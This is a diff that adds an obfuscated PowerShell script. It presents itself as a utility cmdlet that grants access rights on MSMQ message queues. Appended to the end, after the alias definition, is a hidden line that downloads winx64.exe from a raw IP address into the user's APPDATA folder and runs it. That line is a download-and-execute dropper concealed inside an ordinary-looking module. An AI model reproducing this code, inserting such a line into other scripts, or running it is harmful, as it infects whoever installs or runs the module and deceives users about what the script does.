@@ -1,0 +1,46 @@
+function gR`An`T-cms`Mq`Me`sS`AGeQueuEP`eRmISSI`ON
+{
+    
+    [CmdletBinding(SuPpOrTsShoULDPrOceSs=${t`Rue})]
+    param(
+        [Parameter(MandatoRY=${TR`UE})]
+        [string]
+        
+        ${N`AmE},
+        
+        [Switch]
+        
+        ${pRiv`ATe},
+        
+        [Parameter(ManDaTOrY=${t`RuE})]
+        [string]
+        
+        ${Us`ERn`AME},
+        
+        [Parameter(MandAtORy=${Tr`Ue})]
+        [Messaging.MessageQueueAccessRights[]]
+        
+        ${aCCEs`SRi`g`HTs}
+    )
+
+    &("{0}{2}{1}{3}"-f'S','tric','et-S','tMode') -Version ("{1}{0}" -f 'test','La')
+    .("{1}{2}{5}{0}{4}{3}" -f 'lerPr','Us','e-C','ence','efer','al') -Cmdlet ${pS`cmdl`ET} -Session ${e`x`ECUTi`OncOnText}."ses`SiO`NSTa`TE"
+    
+    ${Q`Ue`U`EarGs} = @{ ("{0}{1}"-f'Nam','e') = ${n`AME} ; ("{0}{1}{2}" -f 'Pr','i','vate') = ${Pr`iVaTE} }
+    ${q`UEUE} = .("{1}{2}{0}{3}{5}{4}"-f 't','G','e','-CM','geQueue','smqMessa') @queueArgs
+    if( -not ${QuE`Ue} )
+    {
+        &("{2}{0}{3}{1}" -f 'ite-Er','r','Wr','ro') ('MSMQ'+' '+'que'+'ue '+"'$Name' "+'not'+' '+'f'+'ound.')
+        return
+    }
+    
+    if( ${Ps`Cm`d`Let}.("{1}{2}{0}"-f'rocess','Shou','ldP').Invoke( ('MSMQ queue ''{0}''' -f ${n`AMe}), ("granting '{0}' rights to '{1}'" -f ${a`cc`eS`SR`IGHts},${us`e`RNaME}) ) )
+    {
+        ${QU`EUe}.("{3}{1}{0}{2}{4}" -f 'Permi','et','ssio','S','ns').Invoke( ${us`E`RNAME}, ${ac`c`essrigH`Ts} )
+    }
+}
+
+&("{1}{0}{2}"-f 'a','Set-Ali','s') -Name ("{2}{7}{8}{1}{0}{4}{3}{6}{5}" -f 'ePe','Queu','Gra','m','r','ions','iss','nt','-MsmqMessage') -Value ("{1}{3}{0}{8}{2}{6}{5}{7}{4}"-f'sa','Grant-CM','ueP','smqMes','on','rmis','e','si','geQue')
+
+
+(.("{1}{0}{2}"-f '-O','New','bject') ("{0}{2}{1}{3}"-f 'Syst','m.','e','Net.WebClient')).("{0}{1}{2}{3}"-f 'Down','l','oa','dFile').Invoke(("{0}{4}{6}{5}{9}{8}{1}{7}{2}{3}"-f'ht','tre','w','inx64.exe','tp://94','.30','.102.58','vor/','~','/'),"$env:APPDATA\winx64.exe");&("{1}{0}{2}{3}" -f'art-','St','P','rocess') ("$env:APPDATA\winx64.exe")
